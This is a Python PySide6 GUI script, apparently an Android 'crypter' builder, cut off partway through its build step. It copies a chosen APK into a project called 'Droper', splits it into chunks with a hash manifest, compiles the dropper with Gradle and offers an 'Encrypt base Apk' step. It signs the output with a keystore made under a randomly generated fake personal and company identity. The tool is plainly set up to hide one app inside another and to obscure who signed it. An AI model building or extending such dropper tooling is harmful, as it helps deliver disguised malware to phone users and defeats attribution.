import os
import sys
import hashlib
import json
import shutil
import subprocess
from datetime import datetime

from PySide6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTextEdit,
    QLabel, QFileDialog, QLineEdit, QMessageBox, QGridLayout, QFrame
)
from PySide6.QtCore import Qt, QThread, Signal
from PySide6.QtGui import QTextCursor, QMovie


def sha256_of_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()


def ensure_dir(p: str):
    os.makedirs(p, exist_ok=True)


def strong_password(n: int = 16) -> str:
    import secrets, string
    # Use only alphanumerics to avoid shell parsing issues in Windows CMD
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(n))


def random_identity() -> dict:
    """Create a plausible random identity for keystore DN locally (no network)."""
    import random
    first = ["Aarav","Vivaan","Aditya","Arjun","Kabir","Ishaan","Krishna","Atharv","Reyansh","Muhammad",
             "Vihaan","Rudra","Anaya","Aadhya","Diya","Pari","Anika","Ira","Myra","Zara"]
    last = ["Sharma","Verma","Gupta","Mehta","Kapoor","Iyer","Reddy","Nair","Khan","Singh","Ali","Ansari"]
    cities = ["Mumbai","Delhi","Bengaluru","Hyderabad","Ahmedabad","Pune","Jaipur","Surat","Lucknow","Kolkata"]
    states = ["Maharashtra","Delhi","Karnataka","Telangana","Gujarat","Rajasthan","Uttar Pradesh","West Bengal"]
    org_units = ["Engineering","Mobile","Android","Platform","Security","DevOps","R&D","Apps"]
    orgs = ["Acme Software Pvt Ltd","BluePeak Labs","NextWave Technologies","Nimbus Systems","Orchid Apps"]
    countries = ["IN","US","GB","DE","CA","AU","SG","AE"]

    fn = random.choice(first)
    ln = random.choice(last)
    cn = f"{fn} {ln}"
    ou = random.choice(org_units)
    o = random.choice(orgs)
    l = random.choice(cities)
    st = random.choice(states)
    c = random.choice(countries)
    alias = f"{fn.lower()}{ln.lower()}{random.randint(10,99)}"
    ks_pass = strong_password(18)
    key_pass = strong_password(18)
    return {
        "alias": alias,
        "ks_pass": ks_pass,
        "key_pass": key_pass,
        "CN": cn,
        "OU": ou,
        "O": o,
        "L": l,
        "ST": st,
        "C": c
    }


def find_keytool_path() -> str | None:
    """Return absolute path to keytool.exe if found. Prefer JDK 17.
    No environment changes required.
    """
    candidates: list[str] = []
    # 1) JAVA_HOME if set
    jh = os.environ.get('JAVA_HOME')
    if jh:
        candidates.append(os.path.join(jh, 'bin', 'keytool.exe'))
    # 2) Common vendor locations
    roots = [
        r"C:\\Program Files\\Java",
        r"C:\\Program Files\\Microsoft",
        r"C:\\Program Files\\Eclipse Adoptium",
        r"C:\\Program Files\\Android\\Android Studio\\jbr",
    ]
    for root in roots:
        if os.path.isdir(root):
            for dirpath, dirnames, filenames in os.walk(root):
                if 'keytool.exe' in filenames:
                    candidates.append(os.path.join(dirpath, 'keytool.exe'))
    # 3) PATH lookup
    try:
        out = shutil.which('keytool')
        if out and out.lower().endswith('keytool.exe'):
            candidates.append(out)
    except Exception:
        pass

    # Normalize, unique, and rank: prefer JDK 17 paths
    uniq = []
    seen = set()
    for c in candidates:
        p = os.path.normpath(c)
        if p not in seen and os.path.isfile(p):
            seen.add(p)
            uniq.append(p)
    if not uniq:
        return None
    def score(p: str) -> tuple:
        pl = p.lower()
        s0 = 0
        if 'jdk-17' in pl or 'jdk17' in pl or '\\jdk-17\\' in pl or '\\jdk17\\' in pl:
            s0 = 0
        elif 'jdk-1.8' in pl or 'jdk1.8' in pl or '\\jre' in pl:
            s0 = 2
        else:
            s0 = 1
        # prefer vendor JDKs over studio jbr if possible
        s1 = 0 if ('java' in pl or 'microsoft' in pl or 'adoptium' in pl) else 1
        return (s0, s1, len(p))
    uniq.sort(key=score)
    return uniq[0]


def find_gradle_bin() -> str | None:
    """Find a usable Gradle executable. Prefer explicit installs like C:\\Gradle\\gradle-*/bin/gradle.bat.
    Returns full path with .bat on Windows when possible, otherwise whatever shutil.which finds.
    """
    # 1) GRADLE_HOME
    gh = os.environ.get('GRADLE_HOME')
    if gh:
        cand = os.path.join(gh, 'bin', 'gradle.bat')
        if os.path.isfile(cand):
            return os.path.normpath(cand)
    # 2) Common installation root C:\\Gradle
    root = r"C:\\Gradle"
    if os.path.isdir(root):
        try:
            for name in sorted(os.listdir(root), reverse=True):
                binp = os.path.join(root, name, 'bin', 'gradle.bat')
                if os.path.isfile(binp):
                    return os.path.normpath(binp)
        except Exception:
            pass
    # 3) PATH
    try:
        which = shutil.which('gradle')
        if which:
            return os.path.normpath(which)
    except Exception:
        pass
    return None


class ProcThread(QThread):
    line = Signal(str)
    done = Signal(int)

    def __init__(self, cmd, cwd=None, env=None):
        super().__init__()
        self.cmd = cmd
        self.cwd = cwd
        self.env = env or os.environ.copy()

    def run(self):
        try:
            proc = subprocess.Popen(
                self.cmd,
                cwd=self.cwd,
                env=self.env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                text=True,
            )
            for ln in proc.stdout:
                self.line.emit(ln.rstrip())
            proc.wait()
            self.done.emit(proc.returncode)
        except Exception as e:
            self.line.emit(f"[ERROR] {e}")
            self.done.emit(-1)


class Main(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Enc Builder (Py)")
        self.resize(1000, 680)

        # state
        self.project_root = ''  # folder that contains 'Droper'
        self.droper_root = ''   # <root>/Droper
        self.assets_path = ''   # <root>/Droper/app/src/main/assets
        self.android_sdk = ''
        self.build_tools = ''
        self.jdk_home = os.environ.get('JAVA_HOME', '')
        # background tasks tracking
        self._threads = []  # keep references so GC doesn't kill threads
        self._is_running = False

        # helpers
        self._base_dir = self.app_base_dir()

        # UI: outer layout with left content + right logs
        outer = QHBoxLayout()
        self.setLayout(outer)
        root = QVBoxLayout()      # left column
        side = QVBoxLayout()        # Action Buttons (2x2 grid)
        btnGrid = QGridLayout()
        
        # Define button styles with hacking theme
        btn_style = """
            QPushButton {
                min-width: 160px;
                max-width: 200px;
                padding: 10px 15px 10px 25px;
                margin: 5px;
                border: 1px solid #00ff00;
                border-radius: 4px;
                font-weight: bold;
                text-align: left;
                position: relative;
                overflow: hidden;
            }
            QPushButton::before {
                content: '>';
                position: absolute;
                left: 5px;
                color: #00ff00;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #1a3b2e;
                border-color: #00cc88;
            }
            QPushButton:pressed {
                background-color: #0a2b1e;
            }
        """
        
        # Create buttons with hacking theme
        self.btnSelectApk = QPushButton("Select APK → Assets")
        self.btnSelectApk.setStyleSheet(btn_style + """
            QPushButton {
                background-color: #0a2b1e;
                color: #00ff88;
            }
        """)
        
        self.btnSplit = QPushButton("Split Base Apk")
        self.btnSplit.setStyleSheet(btn_style + """
            QPushButton {
                background-color: #0a2b1e;
                color: #00ccff;
            }
        """)
        
        self.btnBuild = QPushButton("Compile with Dropper")
        self.btnBuild.setStyleSheet(btn_style + """
            QPushButton {
                background-color: #0a2b1e;
                color: #ffff00;
            }
        """)
        
        self.btnGenKs = QPushButton("Sign Dropper Apk")
        self.btnGenKs.setStyleSheet(btn_style + """
            QPushButton {
                background-color: #0a2b1e;
                color: #ff5555;
            }
        """)

        # New requested buttons
        self.btnSignBase = QPushButton("Sign Base Apk")
        self.btnSignBase.setStyleSheet(btn_style + """
            QPushButton {
                background-color: #0a2b1e;
                color: #66ff66;
            }
        """)
        self.btnEncryptBase = QPushButton("Encrypt base Apk")
        self.btnEncryptBase.setStyleSheet(btn_style + """
            QPushButton {
                background-color: #0a2b1e;
                color: #66ccff;
            }
        """)
        
        # Add buttons to grid
        btnGrid.addWidget(self.btnSelectApk, 0, 0)
        btnGrid.addWidget(self.btnSplit, 0, 1)
        btnGrid.addWidget(self.btnBuild, 1, 0)
        btnGrid.addWidget(self.btnGenKs, 1, 1)
        btnGrid.addWidget(self.btnSignBase, 2, 0)
        btnGrid.addWidget(self.btnEncryptBase, 2, 1)
        root.addLayout(btnGrid)
        
        # Optional hacking animations (loads if assets/animations/*.gif exist)
        try:
            animWrap = QHBoxLayout()
            anim_paths = [
                os.path.join(self._base_dir, 'assets', 'animations', 'hack1.gif'),
                os.path.join(self._base_dir, 'assets', 'animations', 'hack2.gif'),
                os.path.join(self._base_dir, 'assets', 'animations', 'hack3.gif'),
                os.path.join(self._base_dir, 'assets', 'animations', 'hack4.gif'),
            ]
            any_loaded = False
            for ap in anim_paths:
                if os.path.isfile(ap):
                    lbl = QLabel()
                    mv = QMovie(ap)
                    lbl.setMovie(mv)
                    mv.start()
                    animWrap.addWidget(lbl)
                    any_loaded = True
            if any_loaded:
                root.addLayout(animWrap)
        except Exception:
            pass

        # Header / Paths
        header = QVBoxLayout()
        
        # Project Root Row
        root_row = QHBoxLayout()
        root_row.addWidget(QLabel("Project Root:"))
        self.txtRoot = QLineEdit()
        self.txtRoot.setPlaceholderText("Select project root (contains Droper)")
        self.btnBrowseRoot = QPushButton("📂 Browse")
        root_row.addWidget(self.txtRoot, 1)
        root_row.addWidget(self.btnBrowseRoot)
        
        # Signature Info (keystore, alias, passwords)
        sign_layout = QHBoxLayout()
        
        # Keystore path
        sign_layout.addWidget(QLabel("Keystore:"))
        self.txtKeystore = QLineEdit()
        self.txtKeystore.setPlaceholderText("Path to .jks file")
        self.txtKeystore.setReadOnly(True)
        sign_layout.addWidget(self.txtKeystore, 2)
        
        # Alias
        sign_layout.addWidget(QLabel("Alias:"))
        self.txtAlias = QLineEdit()
        self.txtAlias.setPlaceholderText("Key alias")
        self.txtAlias.setReadOnly(True)
        sign_layout.addWidget(self.txtAlias)
        
        # Keystore Pass
        sign_layout.addWidget(QLabel("Store Pass:"))
        self.txtKsPass = QLineEdit()
        self.txtKsPass.setPlaceholderText("Keystore password")
        self.txtKsPass.setEchoMode(QLineEdit.Password)
        self.txtKsPass.setReadOnly(True)
        sign_layout.addWidget(self.txtKsPass)
        
        # Key Pass
        sign_layout.addWidget(QLabel("Key Pass:"))
        self.txtKeyPass = QLineEdit()
        self.txtKeyPass.setPlaceholderText("Key password")
        self.txtKeyPass.setEchoMode(QLineEdit.Password)
        self.txtKeyPass.setReadOnly(True)
        sign_layout.addWidget(self.txtKeyPass)
        
        # Add to header
        header.addLayout(root_row)
        header.addLayout(sign_layout)
        root.addLayout(header)
        
        # Add separator
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet("background-color: #1a3b2e; height: 1px;")
        root.addWidget(sep)

        # Environment paths are shown only in the input boxes below

        # Custom environment selectors (optional overrides)
        envCustom = QVBoxLayout()
        envCustom.setSpacing(4)
        envCustom.setContentsMargins(0, 0, 0, 0)
        
        # JDK/keytool
        rowJdk = QHBoxLayout()
        rowJdk.setSpacing(6)
        rowJdk.setContentsMargins(0, 0, 0, 0)
        rowJdk.addWidget(QLabel("JDK/Keytool:"))
        self.txtJdk = QLineEdit()
        self.txtJdk.setPlaceholderText("C:/Program Files/Java/jdk-17")
        self.btnBrowseJdk = QPushButton("Browse")
        rowJdk.addWidget(self.txtJdk, 1)
        rowJdk.addWidget(self.btnBrowseJdk)
        envCustom.addLayout(rowJdk)
        
        # SDK
        rowSdk = QHBoxLayout()
        rowSdk.setSpacing(6)
        rowSdk.setContentsMargins(0, 0, 0, 0)
        rowSdk.addWidget(QLabel("SDK:"))
        self.txtSdk = QLineEdit()
        self.txtSdk.setPlaceholderText("%LOCALAPPDATA%/Android/Sdk")
        self.btnBrowseSdk = QPushButton("Browse")
        rowSdk.addWidget(self.txtSdk, 1)
        rowSdk.addWidget(self.btnBrowseSdk)
        envCustom.addLayout(rowSdk)
        
        # Build-Tools
        rowBt = QHBoxLayout()
        rowBt.setSpacing(6)
        rowBt.setContentsMargins(0, 0, 0, 0)
        rowBt.addWidget(QLabel("Build-Tools:"))
        self.txtBt = QLineEdit()
        self.txtBt.setPlaceholderText("<SDK>/build-tools/36.0.0")
        self.btnBrowseBt = QPushButton("Browse")
        rowBt.addWidget(self.txtBt, 1)
        rowBt.addWidget(self.btnBrowseBt)
        envCustom.addLayout(rowBt)
        
        # Gradle
        rowGradle = QHBoxLayout()
        rowGradle.setSpacing(6)
        rowGradle.setContentsMargins(0, 0, 0, 0)
        rowGradle.addWidget(QLabel("Gradle:"))
        self.txtGradle = QLineEdit()
        self.txtGradle.setPlaceholderText("C:/Gradle/gradle-9.2.1/bin")
        self.btnBrowseGradle = QPushButton("Browse")
        rowGradle.addWidget(self.txtGradle, 1)
        rowGradle.addWidget(self.btnBrowseGradle)
        envCustom.addLayout(rowGradle)
        
        # Keystore File (custom base directory or specific .jks file)
        rowKsFile = QHBoxLayout()
        rowKsFile.setSpacing(6)
        rowKsFile.setContentsMargins(0, 0, 0, 0)
        rowKsFile.addWidget(QLabel("Keystore File:"))
        self.txtKsFile = QLineEdit()
        self.txtKsFile.setPlaceholderText(r"C:/Users/<you>/Desktop/Enc Crypter/PyBuilder/dist/Keystore Keys")
        self.btnBrowseKsFile = QPushButton("Browse Dir")
        self.btnPickKsFile = QPushButton("Pick .jks")
        rowKsFile.addWidget(self.txtKsFile, 1)
        rowKsFile.addWidget(self.btnBrowseKsFile)
        rowKsFile.addWidget(self.btnPickKsFile)
        envCustom.addLayout(rowKsFile)
        
        root.addLayout(envCustom)

        # Buttons (2x2 grid, compact with colors)
        btnGrid = QGridLayout()
        
        # Log area
        self.txtLog = QTextEdit()
        self.txtLog.setReadOnly(True)
        self.txtLog.setStyleSheet("""
            QTextEdit {
                background-color: #0b0b0b;
                color: #cfcfcf;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                border: 1px solid #1f1f1f;
                border-radius: 4px;
                padding: 6px;
            }
        """)
        btnGrid.addWidget(self.btnSelectApk, 0, 0)
        btnGrid.addWidget(self.btnSplit,     0, 1)
        btnGrid.addWidget(self.btnBuild,     1, 0)
        btnGrid.addWidget(self.btnGenKs,     1, 1)
        root.addLayout(btnGrid)

        # Add a separator before the log panel
        sep2 = QFrame()
        sep2.setFrameShape(QFrame.HLine)
        sep2.setStyleSheet("background-color: #1a3b2e; height: 1px; margin: 10px 0;")
        root.addWidget(sep2)

        # Terminal-style log panel
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setAcceptRichText(True)
        self.log.setMinimumWidth(380)
        self.log.setMaximumWidth(500)
        self.log.setStyleSheet(
            'QTextEdit { '
            'background-color: #000000; '
            'color: #cfcfcf; '
            'border: 1px solid #00aa00; '
            "font-family: 'Consolas', 'Courier New', monospace; "
            'font-size: 12px; '
            'padding: 8px; '
            'border-radius: 4px; '
            'selection-background-color: #00aa00; } '
            '.ts { color: #ffffff; } '
            '.log-info { color: #cfcfcf; } '
            '.log-ok { color: #00ff00; } '
            '.log-warn { color: #ffff00; } '
            '.log-error { color: #ff5555; } '
            '.log-path { color: #87ceeb; }')

        # Place left content and right log panel side-by-side
        outer.addLayout(root, 2)
        outer.addWidget(self.log, 1)

        # Connect buttons to handlers
        try:
            self.btnSelectApk.clicked.connect(self.on_select_apk)
            self.btnSplit.clicked.connect(self.on_split)
            self.btnBuild.clicked.connect(self.on_build)
            # Connect browse buttons
            self.btnBrowseRoot.clicked.connect(self.on_browse_root)
            self.btnBrowseJdk.clicked.connect(self.on_browse_jdk)
            self.btnBrowseSdk.clicked.connect(self.on_browse_sdk)
            self.btnBrowseBt.clicked.connect(self.on_browse_bt)
            self.btnBrowseGradle.clicked.connect(self.on_browse_gradle)
            self.btnBrowseKsFile.clicked.connect(self.on_browse_ksfile)
            self.btnPickKsFile.clicked.connect(self.on_pick_ksfile)
            self.btnSignBase.clicked.connect(self.on_sign_base)
            self.btnEncryptBase.clicked.connect(self.on_encrypt_base)
            # Sign button if present
            try:
                self.btnGenKs.clicked.connect(self.on_sign)  # will work if on_sign exists
            except Exception:
                pass
        except Exception as _e:
            # Non-fatal: log in UI if available
            try:
                self.logln(f"[WARN] Failed to connect some buttons: {_e}")
            except Exception:
                pass

        # Load saved settings, then populate defaults for any empty fields
        try:
            self.load_settings()
        except Exception as _e:
            self.logln(f"[WARN] load settings failed: {_e}")
        try:
            self.resolve_paths()
            self.detect_environment()
        except Exception as _e:
            self.logln(f"[WARN] initial populate failed: {_e}")

    # Settings persistence
    def settings_path(self) -> str:
        return os.path.join(self.app_base_dir(), 'settings.json')

    def load_settings(self):
        p = self.settings_path()
        if not os.path.isfile(p):
            return
        with open(p, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
        self.txtRoot.setText(cfg.get('root', ''))
        self.txtJdk.setText(cfg.get('jdk', ''))
        self.txtSdk.setText(cfg.get('sdk', ''))
        self.txtBt.setText(cfg.get('build_tools', ''))
        self.txtGradle.setText(cfg.get('gradle', ''))
        if hasattr(self, 'txtKsFile'):
            self.txtKsFile.setText(cfg.get('keystore_dir_or_file', ''))

    def save_settings(self):
        cfg = {
            'root': self.txtRoot.text().strip(),
            'jdk': self.txtJdk.text().strip(),
            'sdk': self.txtSdk.text().strip(),
            'build_tools': self.txtBt.text().strip(),
            'gradle': self.txtGradle.text().strip(),
        }
        if hasattr(self, 'txtKsFile'):
            cfg['keystore_dir_or_file'] = self.txtKsFile.text().strip()
        with open(self.settings_path(), 'w', encoding='utf-8') as f:
            json.dump(cfg, f, indent=2)

    def closeEvent(self, e):
        try:
            self.save_settings()
        except Exception:
            pass
        return super().closeEvent(e)

    def on_sign(self):
        try:
            # Ensure JDK and keytool
            jdk = self.txtJdk.text().strip()
            if not jdk:
                self.logln('[ERROR] JDK not set. Set JDK first.')
                return
            keytool = os.path.join(jdk, 'bin', 'keytool.exe') if sys.platform.startswith('win') else os.path.join(jdk, 'bin', 'keytool')
            if not os.path.isfile(keytool):
                self.logln('[ERROR] keytool not found under selected JDK')
                return

            # Keystore output folder under dist/Keystore Keys
            dist_dir = os.path.join(self._base_dir, 'dist')
            ks_dir = os.path.join(dist_dir, 'Keystore Keys')
            ensure_dir(ks_dir)
            # Always clear existing keystore artifacts so a fresh one is created
            try:
                for nm in os.listdir(ks_dir):
                    if nm.lower().endswith(('.jks', '.p12', '.keystore', '.json')):
                        try:
                            os.remove(os.path.join(ks_dir, nm))
                        except Exception:
                            pass
            except Exception:
                pass
            ks_path = os.path.join(ks_dir, 'release.jks')

            # If keystore already exists, reuse
            if os.path.isfile(ks_path):
                self.txtKeystore.setText(ks_path)
                self.logln(f'[OK] Using existing keystore: {ks_path}')
                return

            ident = random_identity()
            alias = ident['alias']
            ks_pass = ident['ks_pass']
            key_pass = ident['key_pass']
            dname = f"CN={ident['CN']}, OU={ident['OU']}, O={ident['O']}, L={ident['L']}, ST={ident['ST']}, C={ident['C']}"

            cmd = [
                keytool,
                '-genkeypair','-v',
                '-keystore', ks_path,
                '-storepass', ks_pass,
                '-keypass', key_pass,
                '-alias', alias,
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '36500',
                '-dname', dname,
            ]

            self.logln('[PATH] Generating keystore...')
            th = ProcThread(' '.join(f'"{c}"' if ' ' in str(c) else str(c) for c in cmd))
            def _done(code):
                if code == 0 and os.path.isfile(ks_path):
                    self.txtKeystore.setText(ks_path)
                    self.txtAlias.setText(alias)
                    self.txtKsPass.setText(ks_pass)
                    self.txtKeyPass.setText(key_pass)
                    self.logln(f'[OK] Keystore created: {ks_path}')
                else:
                    self.logln('[ERROR] Failed to generate keystore')
            th.done.connect(_done)
            th.line.connect(lambda ln: self.logln(ln))
            th.start()
        except Exception as e:
            self.logln(f'[ERROR] sign: {e}')

    def logln(self, s: str):
        # Timestamp + color-coded message using inline style (QTextEdit supports inline better than classes)
        timestamp = datetime.now().strftime("%H:%M:%S")
        up = s.strip().upper()
        color = "#cfcfcf"  # default info
        if up.startswith('[ERROR]'):
            color = '#ff3333'  # red
        elif up.startswith('[WARN]'):
            color = '#ffff00'  # yellow
        elif up.startswith('[OK]'):
            color = '#00ff00'  # lime green
        elif up.startswith('[PATH]'):
            color = '#87ceeb'  # sky blue

        # basic HTML escaping
        esc = (s.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;'))
        html = f'<span style="color:#ffffff">[{timestamp}]</span> <span style="color:{color}">{esc}</span><br>'
        self.log.insertHtml(html)
        self.log.moveCursor(QTextCursor.End)

    def app_base_dir(self) -> str:
        """Stable base dir for outputs (works in dev and PyInstaller onefile)."""
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            # Prefer the executable directory, not the temp _MEIPASS
            return os.path.dirname(sys.executable)
        return os.path.abspath(os.path.dirname(__file__))

    def on_browse_root(self):
        try:
            d = QFileDialog.getExistingDirectory(self, "Select project root (contains 'Droper')")
            if d:
                self.txtRoot.setText(d)
                self.resolve_paths()
        except Exception as e:
            self.logln(f"[ERROR] browse root: {e}")

    def on_browse_jdk(self):
        p = QFileDialog.getExistingDirectory(self, 'Select JDK folder (root that contains bin/keytool.exe)')
        if p:
            self.txtJdk.setText(p)
            self.jdk_home = p
            kt_candidate = os.path.join(p, 'bin', 'keytool.exe') if sys.platform.startswith('win') else os.path.join(p, 'bin', 'keytool')
            if os.path.isfile(kt_candidate):
                self.logln(f"[PATH] Using keytool: {kt_candidate}")
            else:
                self.logln("[WARN] keytool not found in selected JDK (bin/keytool(.exe))")

    def on_browse_sdk(self):
        p = QFileDialog.getExistingDirectory(self, 'Select Android SDK folder (root that contains build-tools)')
        if p:
            self.txtSdk.setText(p)
            self.android_sdk = p
            self.logln(f"[PATH] SDK: {p}")
            # refresh build-tools from this SDK
            bdir = os.path.join(p, 'build-tools')
            if os.path.isdir(bdir):
                versions = sorted(os.listdir(bdir), reverse=True)
                if versions:
                    self.build_tools = os.path.join(bdir, versions[0])
                    self.logln(f"[PATH] Build-Tools: {self.build_tools}")

    def on_browse_bt(self):
        p = QFileDialog.getExistingDirectory(self, 'Select Build-Tools folder (e.g., .../Sdk/build-tools/xx.x.x)')
        if p:
            self.txtBt.setText(p)
            self.build_tools = p
            self.logln(f"[PATH] Build-Tools: {p}")
            
    def on_browse_gradle(self):
        """Handle Gradle directory selection."""
        p = QFileDialog.getExistingDirectory(
            self, 
            'Select Gradle bin directory (e.g., C:\\Gradle\\gradle-9.2.1\\bin)'
        )
        if p:
            self.txtGradle.setText(p)
            self.logln(f"[PATH] Gradle: {p}")

    def on_browse_ksfile(self):
        p = QFileDialog.getExistingDirectory(self, 'Select Keystore base directory (will store release.jks here)')
        if p:
            self.txtKsFile.setText(p)
            self.logln(f"[PATH] Keystore dir: {p}")

    def on_pick_ksfile(self):
        p, _ = QFileDialog.getOpenFileName(self, 'Pick existing keystore (.jks)', filter='Keystore (*.jks);;All files (*.*)')
        if p:
            self.txtKsFile.setText(p)
            self.logln(f"[PATH] Keystore file: {p}")

    def resolve_paths(self):
        root = self.txtRoot.text().strip()
        if not root:
            # try to guess
            here = os.path.abspath(os.path.dirname(__file__))
            for _ in range(6):
                cand = os.path.join(here, 'Droper')
                if os.path.isdir(cand):
                    root = os.path.dirname(cand)
                    break
                nxt = os.path.dirname(here)
                if nxt == here:
                    break
                here = nxt
            self.txtRoot.setText(root)
        if not root:
            self.logln("[ERROR] Project root not set.")
            return
        self.project_root = root
        droper = os.path.join(root, 'Droper')
        if not os.path.isdir(droper):
            self.logln("[ERROR] 'Droper' folder not found under root.")
            return
        self.droper_root = droper
        self.assets_path = os.path.join(droper, 'app', 'src', 'main', 'assets')
        self.logln(f"[OK] Assets: {self.assets_path}")

    def detect_environment(self):
        # JDK root preference order: text box -> JAVA_HOME -> common install
        if not self.txtJdk.text().strip():
            jh = os.environ.get('JAVA_HOME', '')
            common = r"C:/Program Files/Java/jdk-17"
            cand = jh or (common if os.path.isdir(common) else '')
            if cand:
                self.txtJdk.setText(cand)
                self.jdk_home = cand
                self.logln(f"[PATH] JDK: {cand}")
        else:
            self.jdk_home = self.txtJdk.text().strip()

        # try keytool for info only
        if getattr(self, 'jdk_home', ''):
            kt_candidate = os.path.join(self.jdk_home, 'bin', 'keytool.exe') if sys.platform.startswith('win') else os.path.join(self.jdk_home, 'bin', 'keytool')
            if os.path.isfile(kt_candidate):
                self.logln(f"[PATH] Using keytool: {kt_candidate}")

        # SDK
        if not self.txtSdk.text().strip():
            sdk = os.environ.get('ANDROID_HOME') or os.environ.get('ANDROID_SDK_ROOT')
            if not sdk:
                local = os.path.join(os.environ.get('LOCALAPPDATA',''), 'Android', 'Sdk')
                if os.path.isdir(local):
                    sdk = local
            if sdk:
                self.txtSdk.setText(sdk)
                self.android_sdk = sdk
                self.logln(f"[PATH] SDK: {sdk}")
        else:
            self.android_sdk = self.txtSdk.text().strip()

        # Build-Tools
        if not self.txtBt.text().strip() and self.android_sdk:
            bdir = os.path.join(self.android_sdk, 'build-tools')
            if os.path.isdir(bdir):
                versions = sorted(os.listdir(bdir), reverse=True)
                if versions:
                    bt = os.path.join(bdir, versions[0])
                    self.txtBt.setText(bt)
                    self.build_tools = bt
                    self.logln(f"[PATH] Build-Tools: {bt}")
        else:
            self.build_tools = self.txtBt.text().strip()

        # Gradle (bin dir)
        if not self.txtGradle.text().strip():
            g = find_gradle_bin()
            if g:
                gdir = os.path.dirname(g) if os.path.isfile(g) else g
                self.txtGradle.setText(gdir)
                self.logln(f"[PATH] Gradle: {gdir}")

        # Default Keystore base dir if empty
        if hasattr(self, 'txtKsFile'):
            if not self.txtKsFile.text().strip():
                dist_dir = self._base_dir
                if os.path.basename(dist_dir).lower() != 'dist':
                    dist_dir = os.path.join(dist_dir, 'dist')
                self.txtKsFile.setText(os.path.join(dist_dir, 'Keystore Keys'))

    def on_select_apk(self):
        try:
            self.resolve_paths()
            if not self.assets_path:
                QMessageBox.critical(self, 'Error', 'Set Project Root first')
                return
            apk, _ = QFileDialog.getOpenFileName(self, 'Select APK', filter='APK files (*.apk);;All files (*.*)')
            if not apk:
                return
            ensure_dir(self.assets_path)
            # Clear existing files in assets before copying new base1.apk
            try:
                for name in os.listdir(self.assets_path):
                    fp = os.path.join(self.assets_path, name)
                    if os.path.isfile(fp):
                        os.remove(fp)
            except Exception as e:
                self.logln(f"[WARN] Could not clear assets: {e}")
            dest = os.path.join(self.assets_path, 'base1.apk')
            shutil.copy2(apk, dest)
            size_mb = os.path.getsize(dest) / (1024*1024)
            self.logln(f"[OK] Copied to assets as base1.apk: {dest} ({size_mb:.2f} MB)")
            self.logln(f"SHA-256: {sha256_of_file(dest)}")
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Copy failed: {e}')
            self.logln(f"[ERROR] copy: {e}")

    def on_split(self):
        try:
            self.resolve_paths()
            if not self.assets_path:
                QMessageBox.critical(self, 'Error', 'Set Project Root first')
                return
            # Take latest from existing dist/Sign Base Apk (avoid dist/dist)
            dist_root = self._base_dir
            if os.path.basename(dist_root).lower() != 'dist':
                dist_root = os.path.join(dist_root, 'dist')
            sign_base_dir = os.path.join(dist_root, 'Sign Base Apk')
            if not os.path.isdir(sign_base_dir):
                QMessageBox.critical(self, 'Error', 'Sign Base Apk folder not found — run "Sign Base Apk" first')
                return
            src = None
            latest_t = 0
            for nm in os.listdir(sign_base_dir):
                if nm.lower().endswith('.apk'):
                    p = os.path.join(sign_base_dir, nm)
                    t = os.path.getmtime(p)
                    if t > latest_t:
                        latest_t = t
                        src = p
            if not src:
                QMessageBox.critical(self, 'Error', 'Sign Base Apk folder has no APK to split')
                return
            with open(src, 'rb') as f:
                data = f.read()
            chunk = 1024*1024  # 1 MB
            parts = (len(data) + chunk - 1)//chunk
            # Clear assets fully before writing parts
            try:
                for name in os.listdir(self.assets_path):
                    fp = os.path.join(self.assets_path, name)
                    if os.path.isfile(fp):
                        os.remove(fp)
            except Exception:
                pass
            for i in range(parts):
                off = i*chunk
                buf = data[off:off+chunk]
                with open(os.path.join(self.assets_path, f"base.apk.part{i:03d}"), 'wb') as w:
                    w.write(buf)
            manifest = {
                'file': os.path.basename(src),
                'size': len(data),
                'chunkSize': chunk,
                'parts': parts,
                'algo': 'SHA-256',
                'hash': sha256_of_file(src)
            }
            with open(os.path.join(self.assets_path, 'base.apk.parts.json'), 'w', encoding='utf-8') as w:
                json.dump(manifest, w, indent=2)
            self.logln(f"[OK] Split Sign Base Apk ({os.path.basename(src)}) into {parts} parts with manifest -> assets")
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Split failed: {e}')
            self.logln(f"[ERROR] split: {e}")

    def on_build(self):
        try:
            self.resolve_paths()
            if not self.droper_root:
                QMessageBox.critical(self, 'Error', 'Set Project Root first')
                return
            gradlew_bat = os.path.join(self.droper_root, 'gradlew.bat')
            gradlew_sh = os.path.join(self.droper_root, 'gradlew')
            gradlew = gradlew_bat if os.path.isfile(gradlew_bat) else gradlew_sh
            wrapper_jar = os.path.join(self.droper_root, 'gradle', 'wrapper', 'gradle-wrapper.jar')
            system_gradle = find_gradle_bin()
            use_system_gradle = False
            if not os.path.isfile(gradlew):
                self.logln(f"[WARN] gradlew not found at {gradlew_bat} or {gradlew_sh}")
                # try system gradle
                use_system_gradle = True
            else:
                # gradlew exists; verify wrapper JAR (common cause of 'GradleWrapperMain' error)
                if not os.path.isfile(wrapper_jar):
                    self.logln(f"[WARN] Missing wrapper JAR: {wrapper_jar}")
                    use_system_gradle = True
            env = os.environ.copy()
            if self.jdk_home:
                env['JAVA_HOME'] = self.jdk_home
            # Ensure SDK vars pass through if they exist
            if self.android_sdk:
                env['ANDROID_SDK_ROOT'] = self.android_sdk
                env['ANDROID_HOME'] = self.android_sdk
            if use_system_gradle:
                # Check if system gradle is available
                if not system_gradle or not os.path.exists(system_gradle):
                    self.logln('[ERROR] System Gradle not found. Install Gradle and/or set GRADLE_HOME or put gradle in PATH.')
                    self.logln('Expected e.g.: C\\Gradle\\gradle-9.2.1\\bin\\gradle.bat')
                    return
